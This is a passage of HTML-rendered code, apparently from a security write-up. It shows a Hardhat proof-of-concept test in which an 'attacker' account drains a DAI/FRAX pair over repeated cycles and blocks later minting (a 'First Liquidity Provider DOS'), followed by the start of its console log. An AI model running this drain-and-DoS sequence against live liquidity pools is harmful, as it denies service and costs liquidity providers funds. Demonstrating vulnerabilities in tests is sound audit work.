class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e, Pair TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Call drainPair without initial balances, it will fetch them\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;  Called drainPair.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenABalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenBBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`  Pair \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance after drain: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenABalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`  Pair \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance after drain: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenBBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Assertions based on PoC logs (DAI balance: 1, FRAX balance: 2)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Token A (e.g. DAI if token0) should be 1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Token B (e.g. FRAX if token1) should be 2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e === \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenABalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Cycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance in pair should be 1 after drain`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenBBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Cycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance in pair should be 2 after drain`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// tokenB is token0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenBBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Cycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance in pair should be 1 after drain`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenABalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Cycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance in pair should be 2 after drain`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk6\"\u003e\\n\u003c/span\u003e\u003cspan class=\"mtk8\"\u003eAttempting final mint which should fail...\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Last attempt to mint after inflating totalSupply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereverted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// PoC expects revert, likely due to overflow or ILM with huge totalSupply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk6\"\u003e\\n\u003c/span\u003e\u003cspan class=\"mtk8\"\u003eTest finished: Successfully demonstrated vulnerability and final mint reverted.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVulnerability\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFirst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProvider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDOS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e Address: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x0CECE5951F0aa1b0916435405acEC8dB1fD49Ef9\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003eToken0: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x5FbDB2315678afecb367f032d93F642f64180aa3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003eToken1: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eCycle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferred\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003eof\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan 